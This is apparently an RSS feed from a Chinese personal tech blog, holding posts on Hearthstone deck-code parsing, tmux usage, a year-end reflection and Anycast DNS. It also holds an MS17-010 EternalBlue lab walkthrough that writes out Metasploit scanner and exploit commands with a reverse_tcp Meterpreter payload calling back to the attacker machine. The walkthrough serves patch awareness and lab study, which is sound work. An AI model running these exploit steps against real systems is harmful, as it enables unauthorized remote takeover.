    &lt;span class=&quot;kd&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;num_cards_xn&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;read_varint&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;num_cards_xn&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;kd&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;card_id&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;read_varint&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;kd&quot;&gt;let&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;count&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;read_varint&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;cards&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;push&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;card_id&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;count&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]);&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;cards&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;heroes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;nx&quot;&gt;format&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;这时，再通过建立 DBF ID与卡牌对应关系的数据库，就能够实现在游戏外导入、导出和编辑卡组的功能了。不论是官方的卡牌工具，还是第三方平台（如旅法师营地、盒子）的套牌编辑功能，原理都是相似的。&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://ixjx.herokuapp.com&quot;&gt;搭在heroku上的API&lt;/a&gt;&lt;/p&gt;
</description>
        <pubDate>Thu, 21 May 2020 00:00:00 +0800</pubDate>
        <link>http://localhost:4000/2020-05-21/%E7%82%89%E7%9F%B3%E5%8D%A1%E7%BB%84%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/</link>
        <guid isPermaLink="true">http://localhost:4000/2020-05-21/%E7%82%89%E7%9F%B3%E5%8D%A1%E7%BB%84%E5%8E%9F%E7%90%86%E8%A7%A3%E6%9E%90/</guid>
        
        <category>炉石传说</category>
        
        
        <category>游戏</category>
        
      </item>
    
      <item>
        <title>tmux + oh-my-tmux使用指北</title>
        <description>&lt;ul id=&quot;markdown-toc&quot;&gt;
  &lt;li&gt;&lt;a href=&quot;#tmux是什么&quot; id=&quot;markdown-toc-tmux是什么&quot;&gt;tmux是什么&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#tmux的session&quot; id=&quot;markdown-toc-tmux的session&quot;&gt;tmux的session&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#tmux的window&quot; id=&quot;markdown-toc-tmux的window&quot;&gt;tmux的window&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#tmux的pane&quot; id=&quot;markdown-toc-tmux的pane&quot;&gt;tmux的pane&lt;/a&gt;&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;#tmux-window中的历史输出查看&quot; id=&quot;markdown-toc-tmux-window中的历史输出查看&quot;&gt;tmux window中的历史输出查看&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;blockquote&gt;
  &lt;h3 id=&quot;tmux是什么&quot;&gt;tmux是什么&lt;/h3&gt;
&lt;/blockquote&gt;

&lt;p&gt;　　我们在linux服务器上的工作一般都是通过一个终端连接软件连接到远端系统进行操作，例如使用xshell或者SecureCRT工具通过ssh进行远程连接。&lt;/p&gt;

&lt;p&gt;　　在使用过程中，如果要做比较耗时的操作，例如有时候进行编译，或者下载大文件需要比较长的时间，一般情况下是下班之后直接运行希望第二天早上过来运行完成，这样就不用耽误工作时间。但是网络有时候不稳定，或者timeout，可能在半夜会出现连接断掉的情况，一旦连接断掉，所执行的程序也就中断，当然可以写一个脚本后台运行，但是总不能每次都写脚本吧。&lt;/p&gt;

&lt;p&gt;　　那么有没有一种工具可以解决这样的问题呢，当然是有的了，比如这里提到的tmux。其实类似tmux的工具还有很多。例如gnu screen等。&lt;/p&gt;

&lt;p&gt;　　tmux使用更简单，功能也更强大，当在tmux中工作的时候，即使关掉CRT的连接窗口，再次连接，进入tmux的会话之前的工作仍然在继续。&lt;/p&gt;

&lt;p&gt;　　tmux是一个linux下面的工具，在使用之前需要安装，配置使用&lt;a href=&quot;https://github.com/gpakosz/.tmux&quot;&gt;oh-my-tmux&lt;/a&gt;（取名类似oh-my-zsh）。&lt;/p&gt;

&lt;p&gt;　　tmux中有3种概念，会话(session)，窗口(window)，窗格(pane)。会话有点像是tmux的服务，在后端运行，可以通过tmux命令创建这种服务，并且可以通过tmux命令查看。一个session可以包含多个window，一个window可以被分割成多个pane。首先来看一下tmux的会话。&lt;/p&gt;

&lt;blockquote&gt;
  &lt;h3 id=&quot;tmux的session&quot;&gt;tmux的session&lt;/h3&gt;
&lt;/blockquote&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;tmux new -s mysession1&lt;/code&gt; 新建名为mysession1的会话&lt;br /&gt;
&lt;img src=&quot;https://user-images.githubusercontent.com/4729226/79189057-57e17480-7e53-11ea-911a-126c3fefd1a8.png&quot; alt=&quot;1&quot; /&gt;
可以看到进入session之后的显示，在下面有一条状态栏。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;ctrl+b d&lt;/code&gt; 退出会话，回到shell的终端环境&lt;br /&gt;
当前在tmux的会话环境中，使用一个快捷键&lt;code class=&quot;highlighter-rouge&quot;&gt;ctrl+b d&lt;/code&gt;。&lt;br /&gt;
这里提一下，tmux 窗口有大量的快捷键。所有快捷键都要通过前缀键唤起。默认的前缀键是&lt;code class=&quot;highlighter-rouge&quot;&gt;Ctrl+b&lt;/code&gt;，oh-my-tmux新增了&lt;code class=&quot;highlighter-rouge&quot;&gt;Ctrl+a&lt;/code&gt;。举例来说，帮助命令的快捷键是&lt;code class=&quot;highlighter-rouge&quot;&gt;Ctrl+b ?&lt;/code&gt;。在后面的描述中，我们说的终端环境是指使用SecureCRT进入远程linux之后但是没有进入tmux的会话环境的状态。&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;tmux ls&lt;/code&gt; 终端环境查看会话列表&lt;br /&gt;
在终端环境中执行&lt;code class=&quot;highlighter-rouge&quot;&gt;tmux ls&lt;/code&gt;&lt;br /&gt;
可以看到在列出的列表中，只有1行，说明只有一个session。 
&lt;img src=&quot;https://user-images.githubusercontent.com/4729226/79189704-0803ad00-7e55-11ea-9b5d-bf6ca1c5a138.png&quot; alt=&quot;2&quot; /&gt;&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;ctrl+b s&lt;/code&gt; 会话环境查看会话列表&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;tmux a -t mysession1&lt;/code&gt; 终端环境进入会话&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;tmux kill-session -t mysession1&lt;/code&gt;终端环境销毁会话&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;tmux rename -t old_session_name  new_session_name&lt;/code&gt; 终端环境重命名会话 
&lt;code class=&quot;highlighter-rouge&quot;&gt;ctrl + b $&lt;/code&gt;会话环境重命名会话&lt;/p&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;blockquote&gt;
  &lt;h3 id=&quot;tmux的window&quot;&gt;tmux的window&lt;/h3&gt;
&lt;/blockquote&gt;

&lt;p&gt;　　一个tmux的会话(session)中可以有多个窗口(window)，每个窗口又可以分割成多个pane(窗格)。工作的最小单位其实是窗格。默认情况下在一个window中，只有一个大窗格，占满整个窗口区域。&lt;/p&gt;

&lt;p&gt;　　参考之前新创建的会话中会默认创建一个窗口，名字是zsh，可以通过&lt;code class=&quot;highlighter-rouge&quot;&gt;crtl+b ,&lt;/code&gt; (前缀键之后按一个逗号)来修改当前窗口的名字。&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;ctrl+b c&lt;/code&gt; 创建window&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;切换window&lt;br /&gt;
&lt;code class=&quot;highlighter-rouge&quot;&gt;ctrl+b 1&lt;/code&gt; 切换到1号window，依次类推&lt;br /&gt;
&lt;code class=&quot;highlighter-rouge&quot;&gt;ctrl+b w&lt;/code&gt; (windows的首字母) 列出当前session所有window，通过上、下键切换窗口&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;ctrl+b &amp;amp; &lt;/code&gt; 关闭window 或者直接exit&lt;/p&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;blockquote&gt;
  &lt;h3 id=&quot;tmux的pane&quot;&gt;tmux的pane&lt;/h3&gt;
&lt;/blockquote&gt;

&lt;p&gt;　　这个是最好玩的了，tmux的一个window可以被分成多个pane(窗格)，可以做出分屏的效果。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/4729226/79191375-fe7c4400-7e58-11ea-8d45-81c4cb98ff68.png&quot; alt=&quot;3&quot; /&gt;&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;ctrl+b %&lt;/code&gt; 垂直分屏&lt;br /&gt;
&lt;code class=&quot;highlighter-rouge&quot;&gt;ctrl+b &quot;&lt;/code&gt; 水平分屏&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;切换pane&lt;br /&gt;
&lt;code class=&quot;highlighter-rouge&quot;&gt;ctrl+b o &lt;/code&gt; 依次切换当前窗口下的各个pane&lt;br /&gt;
&lt;code class=&quot;highlighter-rouge&quot;&gt;ctrl+b 上下左右&lt;/code&gt; 根据按箭方向选择切换到某个pane&lt;br /&gt;
&lt;code class=&quot;highlighter-rouge&quot;&gt;ctrl+b Space(空格键)&lt;/code&gt; 对当前窗口下的所有pane重新排列布局，每按一次，换一种样式&lt;br /&gt;
&lt;code class=&quot;highlighter-rouge&quot;&gt;ctrl+b z&lt;/code&gt; 最大化当前pane，再按一次后恢复&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;ctrl+b x&lt;/code&gt; 关闭pane  或者直接exit&lt;/p&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;blockquote&gt;
  &lt;h3 id=&quot;tmux-window中的历史输出查看&quot;&gt;tmux window中的历史输出查看&lt;/h3&gt;
&lt;/blockquote&gt;

&lt;p&gt;　　在tmux里面，因为每个窗口的历史内容已经被tmux接管了。&lt;/p&gt;

&lt;p&gt;　　当我们在每 个tmux的window之间进行来回切换，来回操作，没有办法看到一个window里面屏幕上的历史输出，没办法使用鼠标滚动(例如在CRT中)查看之前的内容。&lt;/p&gt;

&lt;p&gt;　　如果要看当前窗口的历史内容，通过在当前的tmux window 按 &lt;code class=&quot;highlighter-rouge&quot;&gt;ctrl-b&lt;/code&gt;，然后就可以用PgUp/PgDn来浏览历史输出了，按q退出。&lt;/p&gt;
</description>
        <pubDate>Tue, 14 Apr 2020 00:00:00 +0800</pubDate>
        <link>http://localhost:4000/2020-04-14/tmux-+-oh-my-tmux%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8C%97/</link>
        <guid isPermaLink="true">http://localhost:4000/2020-04-14/tmux-+-oh-my-tmux%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8C%97/</guid>
        
        <category>tmux</category>
        
        
        <category>Linux</category>
        
      </item>
    
      <item>
        <title>2019年终总结</title>
        <description>&lt;p&gt;　　又到年末，按照惯例是该来总结一下了。&lt;/p&gt;

&lt;p&gt;　　工作上马马虎虎，感觉上接触了很多新东西，比如了解了一个大型网站背后的架构、逻辑架构，基础设施和业务系统的分离，背后一期一期的工程实践。同时也意识到之前自己基础知识的不牢靠，越工作就越发觉大学时的理论知识的重要性。把工作做着走是很简单的事，难的是了解为什么要这么做？有没有更好的方法？遇到问题该怎么解决等等。当然，能学到多少东西全靠自己领悟了。&lt;/p&gt;

&lt;p&gt;　　IT虽然披着高科技的光鲜外衣，但当你真正掌握了基本的理论知识，本质上都是些很简单的东西，不然社会上就不会到处充斥着“软件工程师速成”、“零起点3个月通过CCIE”等形形色色的培训班了。不信试试三个月能否速成一下律师、证券从业者、或是临床医师？&lt;/p&gt;

&lt;p&gt;　　生活上我最大的感慨是实实在在的人到中年…需要保温杯里泡枸杞了…&lt;/p&gt;

&lt;p&gt;　　最近得了个小感冒+发烧，缓了快一个星期才恢复过来。以前这种小毛病估计连药都不用吃，现在天天药不能停。今年的体检报告也给我敲响了警钟。现在每周下班至少去3次健身房，希望2020能坚持下去。&lt;/p&gt;
</description>
        <pubDate>Thu, 09 Jan 2020 00:00:00 +0800</pubDate>
        <link>http://localhost:4000/2020-01-09/2019%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/</link>
        <guid isPermaLink="true">http://localhost:4000/2020-01-09/2019%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/</guid>
        
        <category>年终总结</category>
        
        
        <category>水</category>
        
      </item>
    
      <item>
        <title>ms17-010渗透测试</title>
        <description>&lt;p&gt;主机工程师每天的一项日常工作就是给系统打各种补丁，我之前一直不以为然，认为这些补丁都可有可无。最近实践了下大名鼎鼎的ms17-010永恒之蓝，让我改变了这一想法。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/4729226/68555108-ee55d800-0466-11ea-8e6a-6d93d8481c54.png&quot; alt=&quot;漏洞&quot; /&gt;&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;主机：kali   192.168.106.242&lt;/p&gt;

  &lt;p&gt;靶机：Windows Server 2008 R2   192.168.106.240&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;永恒之蓝是以前玩剩下的了，现在Metasploit里面已经集成了17-010漏洞，渗透测试更加方便与正式化，内网中用17-010去测一测会发现意外惊喜。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/4729226/68555461-dd0dcb00-0468-11ea-89b7-5fcc0f92abbe.png&quot; alt=&quot;search&quot; /&gt;&lt;/p&gt;

&lt;p&gt;搜索到了4个相关的模块：&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;auxiliary/admin/smb/ms17_010_command&lt;/li&gt;
  &lt;li&gt;auxiliary/scanner/smb/smb_ms17_010&lt;/li&gt;
  &lt;li&gt;exploit/windows/smb/ms17_010_eternalblue&lt;/li&gt;
  &lt;li&gt;exploit/windows/smb/ms17_010_psexec&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;先使用&lt;code class=&quot;highlighter-rouge&quot;&gt;auxiliary/scanner/smb/smb_ms17_010&lt;/code&gt;扫描可能含有ms17-010漏洞的服务器。&lt;/p&gt;

&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msf5 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; use auxiliary/scanner/smb/smb_ms17_010
msf5 auxiliary&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;scanner/smb/smb_ms17_010&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; show options

Module options &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;auxiliary/scanner/smb/smb_ms17_010&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;:

   Name         Current Setting                                                 Required  Description
   &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;         &lt;span class=&quot;nt&quot;&gt;---------------&lt;/span&gt;                                                 &lt;span class=&quot;nt&quot;&gt;--------&lt;/span&gt;  &lt;span class=&quot;nt&quot;&gt;-----------&lt;/span&gt;
   CHECK_ARCH   &lt;span class=&quot;nb&quot;&gt;true                                                            &lt;/span&gt;no        Check &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;architecture on vulnerable hosts
   CHECK_DOPU   &lt;span class=&quot;nb&quot;&gt;true                                                            &lt;/span&gt;no        Check &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;DOUBLEPULSAR on vulnerable hosts
   CHECK_PIPE   &lt;span class=&quot;nb&quot;&gt;false                                                           &lt;/span&gt;no        Check &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;named pipe on vulnerable hosts
   NAMED_PIPES  /usr/share/metasploit-framework/data/wordlists/named_pipes.txt  &lt;span class=&quot;nb&quot;&gt;yes       &lt;/span&gt;List of named pipes to check
   RHOSTS                                                                       &lt;span class=&quot;nb&quot;&gt;yes       &lt;/span&gt;The target address range or CIDR identifier
   RPORT        445                                                             &lt;span class=&quot;nb&quot;&gt;yes       &lt;/span&gt;The SMB service port &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;TCP&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
   SMBDomain    &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;                                                               no        The Windows domain to use &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;authentication
   SMBPass                                                                      no        The password &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;the specified username
   SMBUser                                                                      no        The username to authenticate as
   THREADS      1                                                               &lt;span class=&quot;nb&quot;&gt;yes       &lt;/span&gt;The number of concurrent threads

msf5 auxiliary&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;scanner/smb/smb_ms17_010&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/4729226/68555634-9c628180-0469-11ea-8ad9-dd0df9bda69b.png&quot; alt=&quot;QQ截图20191111095648&quot; /&gt;&lt;/p&gt;

&lt;p&gt;可以看到靶机的ms17-010漏洞被扫描出来了。&lt;/p&gt;

&lt;p&gt;使用&lt;code class=&quot;highlighter-rouge&quot;&gt;exploit/windows/smb/ms17_010_eternalblue&lt;/code&gt;攻击，这里设置meterpreter的payload。&lt;/p&gt;

&lt;div class=&quot;language-sh highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msf5 auxiliary&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;scanner/smb/smb_ms17_010&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; use exploit/windows/smb/ms17_010_eternalblue
msf5 exploit&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;windows/smb/ms17_010_eternalblue&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;rhosts 192.168.106.240
rhosts &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; 192.168.106.240
msf5 exploit&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;windows/smb/ms17_010_eternalblue&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;payload windows/x64/meterpreter/reverse_tcp
payload &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; windows/x64/meterpreter/reverse_tcp
msf5 exploit&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;windows/smb/ms17_010_eternalblue&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;lhost 192.168.106.242
lhost &lt;span class=&quot;o&quot;&gt;=&amp;gt;&lt;/span&gt; 192.168.106.242
msf5 exploit&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;windows/smb/ms17_010_eternalblue&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; show options

Module options &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;exploit/windows/smb/ms17_010_eternalblue&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;:

   Name           Current Setting  Required  Description
   &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;           &lt;span class=&quot;nt&quot;&gt;---------------&lt;/span&gt;  &lt;span class=&quot;nt&quot;&gt;--------&lt;/span&gt;  &lt;span class=&quot;nt&quot;&gt;-----------&lt;/span&gt;
   RHOSTS         192.168.106.240  &lt;span class=&quot;nb&quot;&gt;yes       &lt;/span&gt;The target address range or CIDR identifier
   RPORT          445              &lt;span class=&quot;nb&quot;&gt;yes       &lt;/span&gt;The target port &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;TCP&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
   SMBDomain      &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;                no        &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Optional&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; The Windows domain to use &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;authentication
   SMBPass                         no        &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Optional&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; The password &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;the specified username
   SMBUser                         no        &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Optional&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; The username to authenticate as
   VERIFY_ARCH    &lt;span class=&quot;nb&quot;&gt;true             yes       &lt;/span&gt;Check &lt;span class=&quot;k&quot;&gt;if &lt;/span&gt;remote architecture matches exploit Target.
   VERIFY_TARGET  &lt;span class=&quot;nb&quot;&gt;true             yes       &lt;/span&gt;Check &lt;span class=&quot;k&quot;&gt;if &lt;/span&gt;remote OS matches exploit Target.


Payload options &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;windows/x64/meterpreter/reverse_tcp&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;:

   Name      Current Setting  Required  Description
   &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;      &lt;span class=&quot;nt&quot;&gt;---------------&lt;/span&gt;  &lt;span class=&quot;nt&quot;&gt;--------&lt;/span&gt;  &lt;span class=&quot;nt&quot;&gt;-----------&lt;/span&gt;
   EXITFUNC  thread           &lt;span class=&quot;nb&quot;&gt;yes       &lt;/span&gt;Exit technique &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Accepted: &lt;span class=&quot;s1&quot;&gt;''&lt;/span&gt;, seh, thread, process, none&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
   LHOST     192.168.106.242  &lt;span class=&quot;nb&quot;&gt;yes       &lt;/span&gt;The listen address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;an interface may be specified&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
   LPORT     4444             &lt;span class=&quot;nb&quot;&gt;yes       &lt;/span&gt;The listen port


Exploit target:

   Id  Name
   &lt;span class=&quot;nt&quot;&gt;--&lt;/span&gt;  &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;
   0   Windows 7 and Server 2008 R2 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;x64&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; All Service Packs

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;https://user-images.githubusercontent.com/4729226/68555823-75587f80-046a-11ea-86c6-ff2cb296fa2b.png&quot; alt=&quot;攻击成功&quot; /&gt;&lt;/p&gt;

&lt;p&gt;exploit成功，接下来就可以为所欲为了~~&lt;/p&gt;

&lt;p&gt;所以说补丁还是得勤打，特别是永恒之蓝这种级别的漏洞，毕竟各大厂商不是吃白饭的。&lt;/p&gt;
</description>
        <pubDate>Mon, 11 Nov 2019 00:00:00 +0800</pubDate>
        <link>http://localhost:4000/2019-11-11/ms17-010%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/</link>
        <guid isPermaLink="true">http://localhost:4000/2019-11-11/ms17-010%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/</guid>
        
        <category>渗透</category>
        
        <category>Linux</category>
        
        
        <category>Windows</category>
        
      </item>
    
      <item>
        <title>Anycast实现DNS高可用</title>
        <description>&lt;p&gt;最近在内网里搭建了一套 DNS 系统，2个节点在本地，2个节点在异地，采用的是 OSPF + Anycast 。&lt;/p&gt;

&lt;p&gt;一般来说 Anycast 是搭配 BGP的，路由层面来说 BGP 也比 OSPF 更好控制，但是我们的网络架构 CE 与 PE 之间采用的 OSPF 路由协议（MPLS-VPN），更改起来动作太大。&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;来康康什么是 Anycast ：&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;先说结论：&lt;code class=&quot;highlighter-rouge&quot;&gt;Anycast 就是不同服务器用了相同的 ip 地址&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Anycast 本身是指 IPv6 中一个发送方和最近的一组接收方之间的通信。众所周知，IPv6 中是没有广播的，只有单播(Unicast)、组播(Multicast)和任播(Anycast)，Anycast 在 IPv4 中也同样适用。Anycast 本身就是多个主机使用同一个 ip 地址（该地址是这一组主机的共享单播地址）的一种技术，当发送方发送报文给这个共享单播地址时，报文会根据路由协议路由到这一组主机中离发送方最近的一台，所以这个技术也可以用来做负载均衡。&lt;/p&gt;

&lt;p&gt;在企业网络环境中，Anycast 不太常见，其主要应用于大范围的 DNS 部署，CDN，数据中心等。&lt;/p&gt;

&lt;p&gt;可能会有做企业网的朋友会有疑问，怎么能让互联网的多个主机用同一个 ip，这岂不是 ip 地址冲突了？&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;回答：&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;首先，每一个服务器主机处在不同的地理位置，他们之间不在同一个广播域内。所以把所有主机配置成相同的 ip 地址并不会引起我们日常所见的 ip 地址冲突。&lt;/p&gt;

&lt;p&gt;其次，光靠配置相同的地址是不够的，我们还需要借助路由协议帮忙。&lt;/p&gt;

&lt;p&gt;通过路由协议，各个站点向外宣告相同的 Anycast IP 地址。&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;举个栗子：&lt;/strong&gt;&lt;/p&gt;

